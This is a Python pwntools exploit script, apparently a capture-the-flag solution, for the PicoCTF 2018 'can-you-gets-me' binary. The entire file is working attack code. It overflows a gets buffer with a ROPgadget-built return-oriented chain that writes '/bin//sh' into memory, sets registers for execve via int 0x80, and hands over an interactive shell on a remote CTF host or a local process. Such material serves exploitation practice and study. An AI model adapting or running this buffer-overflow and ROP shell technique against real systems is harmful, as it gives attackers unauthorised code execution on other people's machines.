from pwn import  *
from struct import pack
from sys import argv



context(os='linux', arch='i386', log_level='debug')
binary = './PicoCTF_2018_can-you-gets-me'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',27264) if argv[1]=='r' else process(binary)
# io= gdb.debug(binary,"break *0x400699")


#ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain


#本质上构造execve(0xb, “/bin/sh”, 0, 0);
# eax = 0x0b
# ebx = address of "/bin/sh"
# ecx = 0
# edx = 0



def payload():
	offset = 0x18
	p = b'a'*(offset + 4)
	p += pack('<I', 0x0806f02a)  # pop edx ; ret
	p += pack('<I', 0x080ea060)  # @ .data
	p += pack('<I', 0x080b81c6)  # pop eax ; ret
	p += b'/bin'
	p += pack('<I', 0x080549db)  # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f02a)  # pop edx ; ret
	p += pack('<I', 0x080ea064)  # @ .data + 4
	p += pack('<I', 0x080b81c6)  # pop eax ; ret
	p += b'//sh'
	p += pack('<I', 0x080549db)  # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f02a)  # pop edx ; ret
	p += pack('<I', 0x080ea068)  # @ .data + 8
	p += pack('<I', 0x08049303)  # xor eax, eax ; ret
	p += pack('<I', 0x080549db)  # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9)  # pop ebx ; ret
	p += pack('<I', 0x080ea060)  # @ .data
	p += pack('<I', 0x080de955)  # pop ecx ; ret
	p += pack('<I', 0x080ea068)  # @ .data + 8
	p += pack('<I', 0x0806f02a)  # pop edx ; ret
	p += pack('<I', 0x080ea068)  # @ .data + 8
	p += pack('<I', 0x08049303)  # xor eax, eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0807a86f)  # inc eax ; ret
	p += pack('<I', 0x0806cc25)  # int 0x80
	return p


p = payload()
io.recvuntil(b'GIVE ME YOUR NAME!')
io.send(p)
io.interactive()

